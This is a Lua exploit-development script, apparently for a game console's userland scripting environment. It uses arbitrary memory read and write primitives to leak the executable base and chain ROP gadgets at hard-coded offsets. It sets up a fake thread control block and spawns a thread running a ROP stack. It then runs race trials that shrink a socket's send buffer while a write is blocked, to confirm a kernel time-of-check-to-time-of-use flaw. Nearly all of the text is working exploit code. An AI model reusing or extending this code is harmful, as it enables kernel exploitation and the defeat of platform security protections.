-- CRASH_CLASS: MODERATE
-- PROBE 93c2: SO_SNDBUF concurrent race — pre-alloc, fewer trials

print("=== PROBE 93c2 ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eb=" .. string.format("0x%X%08X", ehi, elo))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))
local fsbase_ptr = memory.alloc(8)
wq(N(fsbase_ptr), uint64(N(fake_tcb)))

-- Pre-alloc all trial resources
local sv = memory.alloc(4)
local ov = memory.alloc(4)
local ol = memory.alloc(4)
local dbuf = memory.alloc(0x1000)
local fill_buf = memory.alloc(256)
local sp_buf = memory.alloc(8)
local child_ret = memory.alloc(8)
local par = memory.alloc(0x40)
local tid_buf = memory.alloc(8)
local stk = memory.alloc(0x4000)
local stk_base = N(stk)

print("alloc done")

-- First: verify child thread ROP works at all
print("")
print("[A] Child thread sanity check")
do
    -- Build simple chain: sysarch + getpid + store + exit
    for i = 0, 0x3FFC, 4 do wd(stk_base + i, 0) end
    local rsp = stk_base + 0x4000 - ((stk_base + 0x4000) % 16) - 8
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    wq(N(child_ret), uint64(0xDEAD))

    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    -- getpid
    emit(g_pop_rax); emit(uint64(20))
    emit(stub)
    -- store rax → child_ret
    emit(g_pop_rdi); emit(uint64(N(child_ret)))
    emit(g_mov_m_rax)
    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x08, uint64(0))
    wq(N(par) + 0x10, uint64(stk_base))
    wq(N(par) + 0x18, uint64(0x4000))
    wq(N(par) + 0x30, tid_buf)
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- Wait
    for w = 1, 200000 do local _ = rd(stk_base) end

    local cr = rd(N(child_ret)) or 0
    print("  child getpid=" .. cr .. " expected=" .. pid_val)
    if cr == pid_val then
        print("  CHILD ROP OK")
    else
        print("  CHILD ROP FAILED — aborting")
        print("=== 93c2 COMPLETE ===")
        return
    end
end

if not alive() then print("DEAD after sanity"); print("=== 93c2 COMPLETE ==="); return end

-- [B] Race trials
print("")
print("[B] RACE TRIALS")
local anomalies = 0
local TRIALS = 10

for trial = 1, TRIALS do
    if not alive() then print("DEAD at t" .. trial); break end

    wq(N(child_ret), uint64(0xDEAD))

    -- socketpair
    wd(N(sp_buf), 0); wd(N(sp_buf)+4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp_buf))
    if r ~= 0 then print("t" .. trial .. ": sp fail"); break end
    local fW = rd(N(sp_buf)) or -1
    local fR = rd(N(sp_buf)+4) or -1

    -- SO_SNDBUF = 65536
    wd(N(sv), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)

    -- Fill to capacity
    local filled = 0
    for i = 1, 300 do
        local ok2, ret = pcall(function()
            return mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(256), uint64(0x80))
        end)
        if not ok2 then break end
        local v = sgn(ret)
        if v <= 0 then break end
        filled = filled + v
    end

    -- Build child chain: sysarch + write(fW, fill_buf, 4096) BLOCKING + store + exit
    for i = 0, 0x3FFC, 4 do wd(stk_base + i, 0) end
    local rsp = stk_base + 0x4000 - ((stk_base + 0x4000) % 16) - 8
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    -- write(fW, fill_buf, 4096) — BLOCKING (no MSG_DONTWAIT)
    emit(g_pop_rdi); emit(uint64(fW))
    emit(g_pop_rsi); emit(uint64(N(fill_buf)))
    emit(g_pop_rdx); emit(uint64(0x1000))
    emit(g_pop_rax); emit(uint64(4))
    emit(stub)
    -- store write result
    emit(g_pop_rdi); emit(uint64(N(child_ret)))
    emit(g_mov_m_rax)
    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    -- Spawn child — blocks in write() because buffer is full
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x08, uint64(0))
    wq(N(par) + 0x10, uint64(stk_base))
    wq(N(par) + 0x18, uint64(0x4000))
    wq(N(par) + 0x30, tid_buf)
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- Let child enter write() and block
    for w = 1, 10000 do local _ = rd(stk_base) end

    -- *** SHRINK hiwat while child is blocked in sbwait ***
    wd(N(sv), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)

    wd(N(ov), 0); wd(N(ol), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), ov, ol) end)
    local hiwat = rd(N(ov)) or -1

    -- Drain read side → wakes child from sbwait
    local drain1 = 0
    for d = 1, 100 do
        local ok4, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok4 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        drain1 = drain1 + dv
    end

    -- Wait for child to finish
    for w = 1, 200000 do local _ = rd(stk_base) end

    -- Read child's write return
    local cr_lo = rd(N(child_ret)) or 0xDEAD
    local cr_hi = rd(N(child_ret) + 4) or 0
    local cret = cr_lo
    if cr_hi == 0xFFFFFFFF then cret = cr_lo - 0x100000000 end -- negative

    -- Drain anything child wrote
    local drain2 = 0
    for d = 1, 100 do
        local ok5, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok5 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        drain2 = drain2 + dv
    end

    local anom = (cret > 0 and cret ~= 0xDEAD and hiwat <= 64)
    if anom then anomalies = anomalies + 1 end

    print(string.format("t%d: fill=%d hw=%d drain1=%d cw=%d drain2=%d%s",
        trial, filled, hiwat, drain1, cret, drain2,
        anom and " ***RACE***" or ""))

    if cret > hiwat and cret > 0 and cret ~= 0xDEAD then
        print(string.format("  CHILD WROTE %d > HIWAT %d", cret, hiwat))
    end

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

print("")
print(string.format("anomalies=%d/%d alive=%s", anomalies, TRIALS, alive() and "Y" or "N"))
if anomalies > 0 then print("*** TOCTOU RACE CONFIRMED ***") end
print("=== 93c2 COMPLETE ===")
